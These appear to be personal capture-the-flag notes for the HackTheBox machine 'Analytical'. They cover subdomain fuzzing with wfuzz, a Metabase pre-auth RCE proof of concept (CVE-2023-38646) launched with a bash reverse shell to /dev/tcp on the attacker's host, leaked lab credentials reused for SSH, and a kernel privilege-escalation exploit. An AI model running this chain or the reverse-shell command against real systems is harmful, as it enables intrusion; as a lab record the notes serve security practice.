# ip
10.10.11.233

# wfuzz subdomains
wfuzz --hh 154 -c -w ../../../SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST:FUZZ.analytical.htb" http://analytical.htb

# result
http://data.analytical.htb

# api info url
http://data.analytical.htb/api/session/properties

# CVE-2023-38646
https://github.com/m3m0o/metabase-pre-auth-rce-poc.git

# reverse shell
python3 main.py -u http://data.analytical.htb -t "249fa03d-fd94-4d5b-b94f-b4ebf3df681f" -c "bash -i >& /dev/tcp/10.10.14.24/4444 0>&1"

# enumeration containers java tools
https://github.com/stealthcopter/deepce

# meta password
An4lytics_ds20223#

# meta_user
META_USER=metalytics

# login page
metalytics@analytical.htb
An4lytics_ds20223#

# metabase version
v0.46.6

# ssh connection
ssh metalytics@analytical.htb -p 22
An4lytics_ds20223#

# root
uname -a

# CVE-2023-2640-CVE-2023-32629
bash exploit.sh